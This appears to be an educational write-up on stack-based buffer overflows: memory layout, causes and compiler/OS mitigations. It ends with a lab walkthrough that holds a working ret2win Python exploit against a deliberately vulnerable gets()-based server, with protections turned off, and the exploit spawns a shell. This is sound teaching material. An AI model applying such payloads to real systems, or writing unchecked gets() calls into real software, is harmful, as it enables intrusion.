# Buffer Overflow

A buffer is a region of computer memory used to temporarily store data as it moves between two different locations or processes.

## Key Segments

### Kernel Space

- The core of the operating system resides here.
- Off-limits to regular programs to ensure system integrity.
- Contains critical code and data structures for managing hardware, processes, and memory.

### Stack

- LIFO (Last-In, First-Out) structure, like a stack of plates.
- Manages function calls:
  - When a function is called, its local variables and return address are "pushed" onto the stack.
  - When the function finishes, this information is "popped" off.
- Stack grows downwards towards lower memory addresses.

### Heap

- Dynamic memory allocation. Think of it as the "free storage" area of your warehouse.
- Programmers use functions like malloc() (in C) to request chunks of memory during runtime.
- Grows upwards towards higher memory addresses.
- Prone to memory fragmentation if not managed carefully.

### BSS (Block Started by Symbol)

- Uninitialized global and static variables.
- The kernel initializes these variables to zero or null before the program starts.

### Data

- Initialized global and static variables (those with assigned values at declaration).

### Text (Code)

- The program's machine instructions – the compiled code itself.
- Often made read-only to prevent accidental modification.

## Buffer Overflow

A buffer overflow, also known as a buffer overrun, is a memory corruption vulnerability that occurs when a program attempts to write data to a fixed-length buffer beyond its allocated memory boundaries. This technical explanation breaks down into the following key points:

- Fixed-length buffer: A buffer is a designated region of memory allocated to temporarily store data. Importantly, these buffers have a pre-defined size, limiting the amount of data they can hold.
- Data writing: Programs often need to copy or move data from one location to another. Buffers are commonly used as intermediary storage during these data transfers.
- Memory boundaries: Every memory allocation has a starting address and an ending address, defining the valid range for data access.
- Overflow condition: When the amount of data written to the buffer exceeds its allocated size, it attempts to overwrite data in adjacent memory locations. This is the overflow condition.

## Causes of Buffer Overflow

1. Low-level programming languages

   - Issue: Languages like C and C++ provide great control but don't have built-in memory safety mechanisms. They require programmers to manually manage memory allocation and track buffer sizes.
   - Risk: A simple oversight in a calculation or loop can allow data to be written beyond a buffer's boundary.

2. Unsafe libraries

   - Issue: Some older standard libraries contain functions (like strcpy, gets in C) that don't perform any bounds checking when copying or manipulating strings.
   - Risk: Using these functions without careful validation leaves programs vulnerable to overflows if input data is unexpectedly larger than allocated buffers.

3. Poor coding practices

   - Issue: Programmers might neglect input validation, make assumptions about input lengths, or use unsafe functions without proper precautions.
   - Risk: These oversights and programming errors open the door for buffer overflows.

4. Lack of secure code review and analysis

   - Issue: Vulnerabilities like buffer overflows may not be caught during development if there aren't rigorous code reviews or if automated analysis tools aren't used.
   - Risk: Buffer overflows could make their way into production code, increasing security risk.

5. Lack of penetration testing

   - Issue: Even well-written code might have exploitable flaws. Without penetration testing (where ethical hackers try to break into the system), latent buffer overflows might remain undetected.
   - Risk: Attackers could find these vulnerabilities before developers do, leaving applications open to exploitation.

6. No specific buffer overflow protection in place

   - Issue: Without utilizing compiler-level safeguards (e.g., stack canaries) or system-level protections (e.g., ASLR - Address Space Layout Randomization), it's easier for attackers to exploit successful overflows.
   - Risk: Even if a buffer overflow occurs, these protections can help mitigate the ability of hackers to reliably take control.

## Specific Buffer Overflow Protection Mechanisms

1. OS Mechanisms

   1.1 Address Space Layout Randomization (ASLR)
       - Concept: Randomizes the positions of key memory structures like the stack, heap, and program libraries.
       - Protection: Makes it difficult for attackers to predict the memory addresses of their injected code, rendering many buffer overflow exploits unreliable.

   1.2 Data Execution Prevention (DEP)
       - Concept: Marks certain memory regions as non-executable (e.g., the stack).
       - Protection: Prevents attackers from injecting malicious code into these regions and then simply executing it.

2. Compiler Mechanisms

   2.1 StackShield
       - Concept: Inserts a "canary" value (a random value) on the stack adjacent to the return address. Before a function returns, the canary is checked. If it's been modified, the program terminates, indicating a likely overflow attempt.
       - Protection: This early detection mechanism can help stop buffer overflow exploits mid-flow.

   2.2 StackGuard
       - Concept: A refinement of the canary concept. Also places canaries, but protects more function pointers on the stack, not just the return address.
       - Protection: More robust defense since attackers might target other pointers to redirect execution.

   2.3 MemGuard
       - Concept: Maintains separate shadow memory storing the valid bounds of buffers allocated on the heap. Runtime checks against this shadow memory prevent out-of-bounds heap accesses.
       - Protection: Specifically focused on protecting against heap-based buffer overflows.

   2.4 Other GCC patches and compiler options
       -fstack-protector: Enables basic stack protection mechanisms like canaries (older GCC versions).
       -fstack-protector-all: More comprehensive stack protection for all functions.
       -D_FORTIFY_SOURCE=2: Activates enhanced bounds checking on common string and memory functions, providing runtime detection for some overflow attempts.

## Different Types of Buffer Overflow

1. Based on Area of Memory

   1.1 Stack-based buffer overflow
       - Target: The program's call stack, a region used to store function parameters, local variables, and the return address (where to continue execution after a function ends).
       - Mechanism: Overflowing a buffer on the stack can overwrite the return address, potentially allowing the attacker to redirect program execution to malicious code.
       - Prevalence: Most common type of buffer overflow due to the stack's predictable layout.

   1.2 Heap-based buffer overflow
       - Target: The heap, a region of dynamic memory allocation where programs request space during runtime.
       - Mechanism: Overflows on the heap corrupt internal data structures used for memory management. Sophisticated attacks manipulate these structures to gain code execution.
       - Exploitation: More complex than stack-based overflows, often requiring deep knowledge of memory management mechanisms.

2. Based on Exploit Technique

   2.1 Off-by-one overflow
       - Nature: A very specific type of overflow where data is written one byte beyond the buffer's boundary.
       - Exploitation: Can sometimes be enough to overwrite a neighboring variable that holds control data or security checks, subtly altering program behavior.

   2.2 Format string overflow
       - Vulnerability: Occurs due to incorrect use of format string functions (like printf) in C. These functions use format specifiers (%s, %d, etc.) to interpret arguments.
       - Exploitation: Attackers inject malicious format specifiers that cause the program to read or write to arbitrary memory locations, potentially leaking sensitive data or executing attacker-controlled code.

   2.3 Integer overflow
       - Concept: When an arithmetic operation attempts to create a numeric value too large or too small to be represented within the available data type. This can lead to a wrap-around effect, giving an unexpected result.
       - Relation to buffer overflows: Integer overflows can sometimes be manipulated to calculate an incorrect buffer size or memory offset, leading indirectly to a buffer overflow condition.

---

## Hands-On Lab: Ret2Win Buffer Overflow Demo

This repository contains a complete, walkthrough-ready demonstration of a **stack-based buffer overflow** exploiting the unsafe `gets()` function. The attack technique used is **ret2win (return-to-win)** — instead of injecting shellcode (which won't work because the stack is non-executable), we overwrite the return address to jump directly to a `debug()` function that spawns `/bin/bash`.

### How to Build

```sh
chmod +x build.sh
./build.sh
```

The build script compiles with all protections **intentionally disabled**:

| Flag | Purpose |
|---|---|
| `-fno-stack-protector` | Disables stack canaries (no guard value to detect overflow) |
| `-m32` | Produces a 32-bit binary — simpler addressing, addresses fit in 4 bytes |
| `-no-pie` | Disables Position-Independent Executable — function addresses are fixed |
| `-O0` | No optimization — keeps stack layout predictable |
| `-g` | Includes debug symbols for analysis in GDB |

### The Vulnerable Server (`server.c`)

```c
void debug()
{
    printf("!! ENTERING DEBUG MODE !!\n");
    system("/bin/bash");
}

int checkPassword()
{
    char password[64];
    printf("password: ");
    gets(password);           // <-- THE BUG: no bounds checking
    return isValidPassword(password);
}
```

**The bug**: `gets()` reads input into `password[64]` with **zero length checking**. Any input longer than 63 characters will overwrite adjacent stack data.

Buffer overflow occurs when user input exceeds the fixed-length buffer, overwriting adjacent memory on the stack where critical control data is stored — including the return address that determines where execution continues after the function finishes.

#### The Stack Layout of `checkPassword()`

Before any input, the stack frame of `checkPassword()` looks like this (low memory at top, stack grows downward):

```
Address        Contents              Offset from buffer
──────────     ──────────────        ─────────────────
0xffffcbb0     password[0..63]       +0  to +63   (64-byte buffer)
0xffffcbf0     (alignment padding)   +64 to +67   (4 bytes)
0xffffcbf4     saved ebx             +68 to +71   (callee-saved register)
0xffffcbf8     saved ebp             +72 to +75   (caller's frame pointer)
0xffffcbfc     return address        +76 to +79   (where execution resumes)
0xffffcc00     (caller's stack — main's frame)
```

When `gets()` writes beyond `password[63]`, it sequentially overwrites:
1. **Alignment padding** (bytes 64-67)
2. **Saved ebx** (bytes 68-71) — a callee-saved register
3. **Saved ebp** (bytes 72-75) — the caller's base pointer
4. **Return address** (bytes 76-79) — **this is what we hijack**

### Password Validation (`secrets.c`)

The password is read from the `./password` file on disk and compared with `strcmp()`. The correct password (`top secrete password`) is intentionally misspelled as a reminder that real credentials should be properly managed. The overflow bypasses this check entirely — we never need the real password.

### The Exploit (`exploit.py`)

```python
import sys

payload  = b"A" * 64               # fill the 64-byte buffer
payload += b"BBBB"                  # overwrite alignment padding
payload += b"CCCC"                  # overwrite saved ebx
payload += b"DDDD"                  # overwrite saved ebp
payload += b"\x08\x04\x91\xe6"[::-1]  # overwrite return address with debug()
payload += b"\n"                    # terminate gets() input

sys.stdout.buffer.write(payload)
```

**Step by step:**

| Bytes | Value | What it overwrites |
|---|---|---|
| 0-63 | `'A' * 64` | The 64-byte `password` buffer |
| 64-67 | `BBBB` | Alignment padding between buffer and saved registers |
| 68-71 | `CCCC` | Saved `ebx` register (restored after function returns) |
| 72-75 | `DDDD` | Saved `ebp` (caller's frame pointer) |
| 76-79 | `\xe6\x91\x04\x08` | **Return address** — overwritten with address of `debug()` |

The return address `0x080491e6` is encoded in little-endian (`[::-1]` reverses the bytes), producing `\xe6\x91\x04\x08`.

**Why `[::-1]`?** x86 is little-endian — the least significant byte is stored first. The 4-byte address `0x080491e6` is written as byte sequence `e6 91 04 08`.

### Running the Exploit

```sh
python3 exploit.py | ./server
```

If it works, you'll drop into a shell:

```
WELCOME TO THE SECURE SERVER
password: [no output — the payload is consumed by gets()]
!! ENTERING DEBUG MODE !!
$ id
uid=1000(skylap) gid=1000(skylap) ...
$ whoami
skylap
```

To run multiple commands:
```sh
(python3 exploit.py; echo "id; whoami; ls") | ./server
```

### Execution Flow (What Happens at Runtime)

1. `main()` calls `checkPassword()`
2. `checkPassword()` calls `gets(password)` — reads our payload (76 bytes + newline)
3. The payload overflows the 64-byte buffer and overwrites the return address with `0x080491e6`
4. `checkPassword()` executes `leave; ret`:
   - `leave`: restores `esp` and `ebp` from the corrupted stack
   - `ret`: pops `0x080491e6` into `eip` (instruction pointer)
5. Execution jumps to `debug()` at `0x080491e6`
6. `debug()` prints `!! ENTERING DEBUG MODE !!` and calls `system("/bin/bash")`
7. We have a shell — game over for the vulnerable program

### Analyzing the Crash with GDB

```sh
gdb ./server
(gdb) disas checkPassword
(gdb) b *checkPassword+55      # break after gets() returns
(gdb) run < <(python3 exploit.py)
(gdb) x/20x $ebp-0x48          # examine the buffer and overflow data
(gdb) info frame               # examine stack frame
(gdb) x/x $ebp+4               # see the overwritten return address
```

### Checking Crash Logs

After a segfault, the kernel logs the faulting instruction pointer:

```sh
dmesg | tail -5
```

This tells you exactly where the program crashed, which helps verify your overflow reached the correct location.

### Why This Exploit Works (Mitigations Disabled)

| Protection | What it does | Why it's disabled |
|---|---|---|
| **Stack canary** | A random value placed before the return address; if overwritten, the program aborts | `-fno-stack-protector` |
| **ASLR** | Randomizes memory addresses so the attacker can't guess debug()'s address | Irrelevant — `-no-pie` keeps addresses fixed, and 32-bit ASLR is weak |
| **NX/DEP** | Marks the stack as non-executable | Not needed — ret2win jumps to existing code, not injected shellcode |
| **PIE** | Randomizes the base address of the binary itself | `-no-pie` keeps the binary at a fixed address |

### If You Run on a 64-bit System

The build script checks for `gcc-multilib`:

```sh
sudo apt install gcc-multilib   # Debian/Ubuntu
```

### Extended Exercises

Once you've got the exploit working, try these modifications:

1. **Change the padding**: What happens if you use 75 bytes of padding? 77?
2. **Jump mid-function**: Change the exploit to jump to `debug+5` (skipping the function prologue) — does it still work?
3. **Change the win function**: Write your own function that reads `flag.txt` instead of spawning a shell
4. **Add a stack canary**: Recompile with `-fstack-protector` — does the exploit still work?
5. **Enable PIE**: Remove `-no-pie` — does the address change?
6. **64-bit version**: Recompile without `-m32` — how does the exploit change? (Hint: addresses are 8 bytes, calling conventions differ)
7. **Return-oriented programming (ROP)**: Instead of a single ret2win, chain multiple gadgets to call `debug()` with arguments
